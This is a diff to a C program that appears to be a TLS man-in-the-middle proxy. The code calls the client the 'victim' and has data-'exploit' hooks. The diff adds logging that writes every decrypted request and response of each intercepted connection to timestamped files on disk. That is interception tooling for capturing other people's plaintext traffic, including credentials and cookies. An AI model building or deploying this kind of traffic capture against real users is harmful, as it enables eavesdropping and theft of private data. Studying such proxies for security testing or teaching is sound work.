@@ -3,6 +3,7 @@
 #include <stdbool.h>
 #include <signal.h>
 #include <sys/socket.h>
+#include <sys/stat.h>
 #include <netinet/tcp.h>
 #include <sys/time.h>
 #include <arpa/inet.h>
@@ -10,6 +11,7 @@
 #include <openssl/err.h>
 #include <netdb.h>
 #include <pthread.h>
+#include <time.h>
 
 #include "sslutil.h"
 
@@ -45,15 +47,29 @@ int create_socket(uint16_t port)
 }
 
 void *handleRequest(void *sslreq);
-void transferData(SSL *victim, SSL *host);
+void transferData(SSL *victim, SSL *host, FILE *logReq, FILE *logRes);
 void modifyRequestHeader(BIO *target, const char *tagStart, const char *valueStart, int len);
 void modifyResponseHeader(BIO *target, const char *tagStart, const char *valueStart, int len);
 void exploitVictimData(char *buffer, int len);
 void exploitHostData(char *buffer, int len);
+int connectionId;
+pthread_mutex_t connectionMutex = PTHREAD_MUTEX_INITIALIZER;
+char logFolder[120];
 
 int main(int argc, char **argv)
 {
     int port = 27013;
+    struct tm *t;
+    time_t tt;
+    time(&tt);
+    t = localtime(&tt);
+    char folder[80] = {0};
+    strftime(folder, 80, "%Y-%m-%d-%H-%M-%S", t);
+    strcat(logFolder, "logs");
+    int s = mkdir(logFolder, S_IRWXU);
+    strcat(logFolder, "/");
+    strcat(logFolder, folder);
+    s = mkdir(logFolder, S_IRWXU);
 
     if (argc == 3)
     {
@@ -101,6 +117,14 @@ void errCloseSSL(SSL *ssl, int err)
         close(fd);
 }
 
+void errCloseFiles(FILE *req, FILE *res)
+{
+    fprintf(req, "\nFILE CLOSED ABNORMALY\n");
+    fprintf(res, "\nFILE CLOSED ABNORMALY\n");
+    fclose(req);
+    fclose(res);
+}
+
 void freeBios(BIO *header, BIO *contentCache, BIO *targetHeader)
 {
     if (header)
@@ -109,6 +133,17 @@ void freeBios(BIO *header, BIO *contentCache, BIO *targetHeader)
         BIO_free(contentCache);
     if (targetHeader)
         BIO_free(targetHeader);
+}
+
+int logBio(BIO *bio, FILE *file)
+{
+    BUF_MEM *mem;
+    BIO_get_mem_ptr(bio, &mem);
+    fwrite(mem->data, 1, mem->length, file);
+}
+int logData(char *buf, int len, FILE *file)
+{
+    fwrite(buf, 1, len, file);
 }
 
 int writeBioToSsl(BIO *bio, SSL *ssl, size_t *written)
@@ -124,9 +159,33 @@ int writeBioToSsl(BIO *bio, SSL *ssl, size_t *written)
 }
 
 #define BUF_SIZE 8192
+typedef struct
+{
+    /* data */
+    SSL *victim;
+    SSL *host;
+    char *origin;
+} ProxySession;
 
 void *handleRequest(void *sslreq)
 {
+    int connid;
+    pthread_mutex_lock(&connectionMutex);
+    connid = ++connectionId;
+    pthread_mutex_unlock(&connectionMutex);
+
+    char fName[256];
+    strcpy(fName, logFolder);
+    sprintf(fName + strlen(fName), "/connection-%d", connid);
+    char fNameReq[256];
+    strcpy(fNameReq, fName);
+    strcat(fNameReq, ".request");
+    FILE *logReq = fopen(fNameReq, "w");
+    char fNameRes[256];
+    strcpy(fNameRes, fName);
+    strcat(fNameRes, ".response");
+    FILE *logRes = fopen(fNameRes, "w");
+
     SSL *ssl = sslreq;
     int client = SSL_get_fd(ssl);
     int err = 0;
@@ -142,6 +201,7 @@ void *handleRequest(void *sslreq)
     if (err != 0) // fatal errors
     {
         errCloseSSL(ssl, err);
+        errCloseFiles(logReq, logRes);
         return NULL;
     }
 
@@ -151,8 +211,15 @@ void *handleRequest(void *sslreq)
     char *endStr = "\r\n\r\n";
     int comparePos = 0;
     bool hasReadHeader = false;
+    int zeroSizeCnt = 0;
     while (!hasReadHeader && (ret = SSL_read_ex(ssl, buffer, BUF_SIZE, &readBytes) >= 0))
     {
+        if (ret == 0)
+        {
+            ret = SSL_do_handshake(ssl);
+            err = SSL_get_error(ssl, ret);
+            continue;
+        }
         if (readBytes > 0) // we should have read header
         {
             for (int i = 0; i < readBytes; i++)
@@ -179,6 +246,10 @@ void *handleRequest(void *sslreq)
                     --i;
                 }
             }
+            if (!hasReadHeader)
+            {
+                BIO_write(headerBio, buffer, readBytes);
+            }
         }
         else
         {
@@ -186,6 +257,7 @@ void *handleRequest(void *sslreq)
             if (err != SSL_ERROR_NONE && err != SSL_ERROR_ZERO_RETURN)
             {
                 errCloseSSL(ssl, err);
+                errCloseFiles(logReq, logRes);
                 return NULL;
             }
         }
@@ -249,6 +321,7 @@ void *handleRequest(void *sslreq)
     {
         LOGERROR(gethostbyname, "Unable to resolve remote host");
         errCloseSSL(ssl, SSL_ERROR_NONE);
+        errCloseFiles(logReq, logRes);
         return NULL;
     }
     addr.sin_addr.s_addr = *(u_int32_t *)remoteHost->h_addr_list[0];
@@ -258,6 +331,7 @@ void *handleRequest(void *sslreq)
         perror("Unable to create socket");
         errCloseSSL(ssl, SSL_ERROR_NONE);
         freeBios(NULL, contentCache, targetHeader);
+        errCloseFiles(logReq, logRes);
         return NULL;
     }
     if (connect(serverSocket, (struct sockaddr *)&addr, sizeof(addr)) < 0)
@@ -267,6 +341,7 @@ void *handleRequest(void *sslreq)
         SSL_write(ssl, "Failed to connect to host!", 26);
         errCloseSSL(ssl, SSL_ERROR_NONE);
         freeBios(NULL, contentCache, targetHeader);
+        errCloseFiles(logReq, logRes);
         return NULL;
     }
     SSL_CTX *subContext = SSL_CTX_new(TLS_client_method());
@@ -279,19 +354,22 @@ void *handleRequest(void *sslreq)
         errCloseSSL(subSsl, err);
         errCloseSSL(ssl, SSL_ERROR_NONE);
         freeBios(NULL, contentCache, targetHeader);
+        errCloseFiles(logReq, logRes);
         return NULL;
     }
 
     ret = writeBioToSsl(targetHeader, subSsl, NULL);
+    logBio(targetHeader, logReq);
     if (ret >= 0) // good connection
     {
         BIO_free(targetHeader);
         ret = writeBioToSsl(contentCache, subSsl, NULL);
+        logBio(contentCache, logReq);
         BIO_free(contentCache);
-        transferData(ssl, subSsl);
+        transferData(ssl, subSsl, logReq, logRes);
     }
 
-    printf("Connection #%lu ended!\n", pthread_self());
+    printf("Connection #%d ended!\n", connid);
 
     SSL_shutdown(subSsl);
     SSL_free(subSsl);
@@ -299,6 +377,9 @@ void *handleRequest(void *sslreq)
     SSL_shutdown(ssl);
     SSL_free(ssl);
     close(client);
+
+    fclose(logReq);
+    fclose(logRes);
 }
 
 void modifyRequestHeader(BIO *target, const char *tagStart, const char *valueStart, int len)
@@ -310,7 +391,7 @@ void modifyResponseHeader(BIO *target, const char *tagStart, const char *valueSt
     int written = BIO_write(target, tagStart, len);
 }
 
-void transferData(SSL *victim, SSL *host)
+void transferData(SSL *victim, SSL *host, FILE *logReq, FILE *logRes)
 {
     char buffer[BUF_SIZE];
     memset(buffer, 0, BUF_SIZE);
@@ -349,9 +430,11 @@ void transferData(SSL *victim, SSL *host)
         if (FD_ISSET(victimSocket, &fd_read))
         {
             ret = SSL_read_ex(victim, buffer, BUF_SIZE, &readBytes);
+            // normally this should be
             if (ret > 0) // success
             {
                 ret = SSL_write_ex(host, buffer, readBytes, &writtenBytes);
+                logData(buffer, readBytes, logReq);
                 if (!ret || readBytes != writtenBytes) // error sending to host
                 {
                     LOGERROR(transferData, "Failed to transmit to Host!");
@@ -431,12 +514,19 @@ void transferData(SSL *victim, SSL *host)
                         }
                         writeBioToSsl(targetHeader, victim, &writtenBytes);
                         writeBioToSsl(contentCache, victim, &writtenBytes);
+                        logBio(targetHeader, logRes);
+                        logBio(contentCache, logRes);
                         freeBios(headerBio, contentCache, targetHeader);
+                    }
+                    else
+                    {
+                        BIO_write(headerBio, buffer, readBytes);
                     }
                 }
                 else
                 {
                     ret = SSL_write_ex(victim, buffer, readBytes, &writtenBytes);
+                    logData(buffer, readBytes, logRes);
                     if (!ret || readBytes != writtenBytes) // error sending to victim
                     {
                         LOGERROR(transferData, "Failed to transmit to victim!");
